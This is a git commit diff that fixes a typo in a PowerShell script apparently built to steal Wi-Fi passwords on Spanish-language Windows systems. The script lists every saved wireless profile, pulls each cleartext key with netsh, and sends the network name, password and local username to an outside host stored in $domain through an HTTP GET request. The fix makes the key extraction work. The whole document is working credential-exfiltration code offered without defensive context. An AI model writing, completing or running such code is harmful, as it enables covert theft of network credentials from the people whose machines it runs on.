832e8404ddad6500210587232b0d33d71f462364
Owen <124302194+Dobliuw@users.noreply.github.com>
2025-12-04 14:37:01 -0300

    Update Windows-GetWLANPasswords_note_ES.ps1

--- Windows-GetWLANPasswords_note_ES.ps1
+++ Windows-GetWLANPasswords_note_ES.ps1
@@ -1,6 +1,6 @@
 netsh wlan show profile | Select-String '(?<=Perfil de todos los usuarios\s+:\s).+' | ForEach-Object {
 	$wlan = $_.Matches.Value
-	$pass = netsh wlan show proile $wlan key=clear | Select-String '(?<=Contenido de la clave\s+:\s).+'
+	$pass = netsh wlan show profile $wlan key=clear | Select-String '(?<=Contenido de la clave\s+:\s).+'
 
 	Invoke-RestMethod -Uri "$domain/username=$env:username&password=$pass&wlan=$wlan" -Method GET
 
